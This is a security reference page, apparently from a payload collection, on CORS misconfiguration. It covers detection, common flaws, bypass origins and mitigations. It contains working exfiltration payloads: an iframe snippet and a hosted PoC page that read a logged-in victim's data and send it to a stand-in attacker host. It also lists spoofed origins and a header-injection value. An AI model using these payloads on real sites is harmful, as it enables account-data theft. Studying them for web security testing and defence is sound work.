# CORS Misconfiguration

> Browsers enforce the Same-Origin Policy and use CORS to relax it. Misconfigured CORS policies can let attacker-origin pages read authenticated responses from a target.

## Summary

- [Headers in Play](#headers-in-play)
- [Detection](#detection)
- [Common Misconfigurations](#common-misconfigurations)
- [Exploit PoC](#exploit-poc)
- [Bypass Tricks](#bypass-tricks)
- [Mitigation](#mitigation)
- [References](#references)

## Headers in Play

| Header | Purpose |
|--------|---------|
| `Origin` | Set by browser, identifies requesting origin |
| `Access-Control-Allow-Origin` | Server response — which origins may read |
| `Access-Control-Allow-Credentials` | If `true`, credentials sent + reads allowed |
| `Access-Control-Allow-Methods` | Methods allowed in CORS preflight |
| `Access-Control-Allow-Headers` | Headers allowed in CORS preflight |
| `Access-Control-Expose-Headers` | Headers JS can read |
| `Vary: Origin` | Tells caches the response varies by Origin |

## Detection

Send with `Origin: https://attacker.tld` and observe:

```
Access-Control-Allow-Origin: https://attacker.tld
Access-Control-Allow-Credentials: true
```

This is the worst case — full read of authenticated responses.

## Common Misconfigurations

### Reflected origin + credentials

```
Origin: https://attacker.tld
↓
Access-Control-Allow-Origin: https://attacker.tld
Access-Control-Allow-Credentials: true
```

### `null` origin allowed

```
Origin: null
↓
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

`null` is sent by sandboxed iframes — easy for attacker to spoof:

```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://target.tld/me',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://attacker.tld/?d='+btoa(t)))</script>"></iframe>
```

### Trusted-domain suffix match

Server checks `Origin.endsWith('target.tld')` — bypass with `evil-target.tld`.

### Substring match

Server checks `'target.tld' in Origin` — bypass with `https://target.tld.attacker.tld`.

### Pre-domain bypass

Server checks startsWith — bypass with `https://target.tld.attacker.tld`.

### Subdomain allow-list with takeover

Server allows `*.target.tld`. Find an unclaimed subdomain (dangling DNS) and take it over (see [../Subdomain Takeover/](../Subdomain%20Takeover/)).

### Wildcard with credentials

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Browsers reject this combination — but the misconfiguration still indicates the developer's intent. Some old browsers / proxies may still honor it.

### Wildcard without credentials but bearer tokens in URLs

```
Access-Control-Allow-Origin: *
```

Means any site can read non-credentialed responses. If sensitive data is returned with token in URL → leak.

## Exploit PoC

Host on `attacker.tld`:

```html
<!doctype html>
<script>
fetch('https://target.tld/api/me', {credentials: 'include'})
  .then(r => r.text())
  .then(t => fetch('https://attacker.tld/log?d=' + encodeURIComponent(t)));
</script>
```

Send the link to a logged-in victim → their account data lands at `attacker.tld/log`.

## Bypass Tricks

### Origins server "trusts" by mistake

```
https://target.tld.attacker.tld
http://target.tld@attacker.tld
https://attacker-target.tld
https://target.tld:80@attacker.tld
https://target.tld../@attacker.tld
file://
chrome-extension://...
```

### Header injection if Origin is reflected raw

```
Origin: https://attacker.tld\r\nX-Injected: yes
```

If reflected into a header, may give CRLF-injection ([../CRLF Injection/](../CRLF%20Injection/)).

### Preflight cache poisoning

If `Access-Control-Max-Age` is large and preflight responses are cacheable per-origin, you may carry over allowed methods/headers cross-context.

## Mitigation

- **Allow-list** the explicit origins you trust (string equality, not regex).
- Set `Vary: Origin` always so caches don't cross-pollute.
- Never pair `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (browsers reject anyway).
- Treat `null` as not-allowed.
- Don't allow subdomain wildcards unless every subdomain is under your control AND audited (subdomain takeover risk).

## References

- [OWASP — CORS](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)
- [PortSwigger — CORS](https://portswigger.net/web-security/cors)
- [MDN — CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
